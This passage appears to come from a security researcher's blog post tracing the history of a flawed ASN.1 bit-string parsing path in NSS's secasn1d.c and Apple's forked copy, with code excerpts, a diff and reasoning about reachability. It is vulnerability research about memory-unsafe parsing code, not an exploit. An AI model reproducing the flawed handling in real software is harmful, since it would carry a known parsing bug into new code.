c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;data &lt;/span&gt;&lt;span class="c1 c4"&gt;=&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="c1 c4"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class="c1 c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;len &lt;/span&gt;&lt;span class="c1 c4"&gt;=&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c4"&gt;0&lt;/span&gt;&lt;span class="c1 c4"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1 c4"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3 c4"&gt;place &lt;/span&gt;&lt;span class="c1 c4"&gt;=&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class="c1 c4"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16 c4"&gt;return&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c4"&gt;0&lt;/span&gt;&lt;span class="c1 c4"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c4"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1 c4"&gt;+&lt;/span&gt;&lt;span class="c3 c4"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class="c1 c4"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;len &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;needBytes&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c16"&gt;unsigned&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;buf&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;7&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;bit_string_unused_bits &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;byte&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;duringBitString&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;pending &lt;/span&gt;&lt;span class="c1"&gt;-=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c14"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;return&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0"&gt;&lt;span class="c19 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;This commit added the &lt;/span&gt;&lt;span class="c7"&gt;item-&amp;gt;data = NULL&lt;/span&gt;&lt;span&gt;&amp;nbsp;line but here it&amp;#39;s only reachable when &lt;/span&gt;&lt;span class="c7"&gt;pending == 0&lt;/span&gt;&lt;span&gt;. I am fairly convinced that this was dead code and not actually reachable (and that the &lt;/span&gt;&lt;span class="c7"&gt;PORT_Assert&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which they commented out was actually valid.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class="c7"&gt;beforeBitString&lt;/span&gt;&lt;span&gt;&amp;nbsp;state (which leads to the &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;method being called) will always be preceded by the &lt;/span&gt;&lt;span class="c7"&gt;afterLength&lt;/span&gt;&lt;span&gt;&amp;nbsp;state (implemented by &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_prepare_for_contents.&lt;/span&gt;&lt;span&gt;) On entry to the &lt;/span&gt;&lt;span class="c7"&gt;afterLength&lt;/span&gt;&lt;span&gt;&amp;nbsp;state &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span&gt;&amp;nbsp;is equal to the parsed length field and &amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_prepare_for_contents&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;does:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c19 c7"&gt;state-&amp;gt;pending = state-&amp;gt;contents_length;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;So in order to reach &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;pending == 0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c7"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span&gt;&amp;nbsp;would also need to be &lt;/span&gt;&lt;span class="c7"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_prepare_for_contents&lt;/span&gt;&lt;span class="c9"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;That means that in the if/else decision tree below, at least one of the two conditionals &lt;/span&gt;&lt;span class="c17"&gt;must&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;be true:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.b58e1df8cbca28721618ec8bc93413630d1f04c0"&gt;&lt;/a&gt;&lt;a id="t.18"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;contents_length &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11"&gt;0&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(!&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;indefinite&lt;/span&gt;&lt;span class="c1"&gt;))&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* A zero-length simple or constructed string; we are done.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;afterEndOfContents&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c1"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;indefinite&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* An indefinite-length string *must* be constructed!&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; dprintf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c22"&gt;&amp;quot;decodeError: prepare for contents indefinite not construncted\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;top&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;status &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;yet it is required that &lt;/span&gt;&lt;span class="c17"&gt;neither&lt;/span&gt;&lt;span&gt;&amp;nbsp;of those be true in order to reach the final &lt;/span&gt;&lt;span class="c7"&gt;else&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is the only path to reaching &lt;/span&gt;&lt;span class="c7"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;via the &lt;/span&gt;&lt;span class="c7"&gt;beforeBitString&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;state:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fc4cdcb36935579371eeed8ebee2943f0d688093"&gt;&lt;/a&gt;&lt;a id="t.19"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c23"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* A non-zero-length simple string.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c23"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;if&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;underlying_kind &lt;/span&gt;&lt;span class="c1"&gt;==&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;SEC_ASN1_BIT_STRING&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c16"&gt;else&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c3"&gt;place &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c3"&gt;&amp;nbsp;duringLeaf&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6"&gt;&lt;span class="c3"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;So at that point (24 August 2001) the NSS codebase had some dead code which looked like it was trying to handle parsing an ASN.1 &lt;/span&gt;&lt;span class="c7"&gt;bitstring&lt;/span&gt;&lt;span class="c9"&gt;&amp;nbsp;which didn&amp;#39;t have an unused-bits byte. As we&amp;#39;ve seen in the rest of this post though, that handling is quite wrong, but it didn&amp;#39;t matter as the code was unreachable. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;The earliest reference to Apple&amp;#39;s fork of that NSS code I can find is in the &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/apple-oss-distributions/SecurityNssAsn1/tree/SecurityNssAsn1-11"&gt;SecurityNssAsn1-11&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;package for OS X 10.3 (Panther) which would have been released October 24th, 2003. In that project we can find a &lt;/span&gt;&lt;span class="c7"&gt;CHANGES.apple&lt;/span&gt;&lt;span&gt;&amp;nbsp;file which tells us &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/apple-oss-distributions/SecurityNssAsn1/blob/SecurityNssAsn1-11/CHANGES.Apple"&gt;a little more about the origins of Apple&amp;#39;s fork&lt;/a&gt;&lt;/span&gt;&lt;span class="c9"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;General Notes&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;-------------&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c19 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;1. This module, SecurityNssAsn1, is based on the Netscape Security&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;Services (&amp;quot;NSS&amp;quot;) portion of the Mozilla Browser project. The &lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;source upon which SecurityNssAsn1 was based was pulled from &lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c7 c19"&gt;&amp;nbsp; &amp;nbsp;the Mozilla CVS repository, top of tree as of January 21, 2003. &lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;The SecurityNssAsn1 project contains only those portions of NSS &lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;used to perform BER encoding and decoding, along with minimal &lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;support required by the encode/decode routines.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c19 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;2. The directory structure of SecurityNssAsn1 differs significantly&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;from that of NSS, rendering simple diffs to document changes&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;unwieldy. Diffs could still be performed on a file-by-file basis.&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;3. All Apple changes are flagged by the symbol __APPLE__, either&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8"&gt;&lt;span class="c19 c7"&gt;&amp;nbsp; &amp;nbsp;via &amp;quot;#ifdef __APPLE__&amp;quot; or in a comment. &lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c19 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span&gt;That document continues on to outline a number of broad changes which Apple made to the code, including reformatting the code and changing a number of APIs to add new features. We also learn the date at which Apple forked the code (January 21, 2003) so we can go back through a github mirror of the mozilla CVS repository to find &lt;/span&gt;&lt;span class="c21"&gt;&lt;a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/blob/1f25ac6059384ad941cb20481acef0e6b4d46dbd/security/nss/lib/util/secasn1d.c"&gt;the version of secasn1d.c as it would have appeared then&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and diff them.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c6 c8 c15"&gt;&lt;span class="c9"&gt;From that diff we can see that the Apple developers actually made fairly significant changes in this initial import, indicating that this code underwent some level of review prior to importing it. For example:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0 c15"&gt;&lt;span class="c9"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.29dca04094676297fb74e68684dc5ebea1c1ec48"&gt;&lt;/a&gt;&lt;a id="t.20"&gt;&lt;/a&gt;&lt;table class="c25"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c6"&gt;&lt;span 